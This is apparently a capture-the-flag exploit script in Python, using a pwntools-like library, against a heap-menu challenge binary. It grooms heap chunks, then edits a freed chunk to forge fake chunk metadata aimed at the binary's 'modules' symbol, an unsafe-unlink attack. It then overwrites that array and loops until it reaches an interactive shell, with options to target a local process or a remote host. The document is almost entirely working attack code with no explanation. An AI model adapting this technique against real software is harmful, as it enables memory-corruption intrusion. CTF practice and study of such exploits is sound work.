#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./chal_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
set max-visualize-chunk-size 0x500
b *0x4014E9
b *0x4016E2
b *0x40180B
b *launch_starship
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def menu(choice: int):
    slna(b'>> ', choice)

def create(index: int, size: int, data: bytes):
    menu(1)
    slna(b'Index: ', index)
    slna(b'Size: ', size)
    sla(b'Data: ', data)

def delete(index: int):
    menu(2)
    slna(b'Index: ', index)

def edit(index: int, data: bytes):
    menu(3)
    slna(b'Index: ', index)
    sla(b'Data: ', data)

# ==================== EXPLOIT ====================
p = start()

create(7, 0x2000, b'A' * 0x10)
create(6, 0x2000, b'B' * 0x10)
create(5, 0x1000, b'C' * 0x10)

delete(7)
delete(6)

create(0, 0x1000, b'D' * 0x10)
create(1, 0x1000, b'E' * 0x10)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

edit(7, p64(0) + p64(0x1011 - 0x10) + p64(exe.sym.modules - 0x18) + p64(exe.sym.modules - 0x10) + b"\x00" * 4064 + p64(0x1000) + p64(0x1010))

delete(1)

edit(0, p64(0x8) * 100)

while True:
    menu(4)
    data = rl()[:-1]
    if b'still' in data:
        continue
    interactive()
    break
